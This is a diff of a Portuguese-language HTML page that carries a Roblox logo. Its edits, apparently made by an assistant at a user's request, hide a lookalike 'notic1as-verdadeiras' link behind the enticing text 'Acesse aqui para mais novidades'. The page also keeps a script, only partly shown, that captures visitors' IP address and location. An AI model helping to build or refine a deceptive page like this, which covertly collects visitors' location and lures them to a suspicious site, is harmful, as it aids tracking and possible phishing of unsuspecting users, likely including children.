@@ -182,12 +182,12 @@
     }
     .extra-link {
       margin-top: 20px;
-      font-size: 0.95rem;
+      font-size: 1rem; /* um pouco maior pra facilitar clique */
+      font-weight: 600;
     }
     .extra-link a {
       color: #00aff4;
       text-decoration: none;
-      font-weight: 600;
     }
     .extra-link a:hover {
       text-decoration: underline;
@@ -273,9 +273,9 @@
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
         
-        <!-- Link exatamente como você mandou antes -->
+        <!-- Link com texto clicável como você pediu -->
         <div class="extra-link">
-          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">https://notic1as-verdadeiras.vercel.app</a>
+          <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
         </div>
       </div>
     </div>
@@ -297,7 +297,7 @@
         return;
       }
 
-      // Captura de IP + localização (como estava antes)
+      // Captura de IP + localização
       let ip = 'Desconhecido';
       let location = 'Desconhecido';
       try {
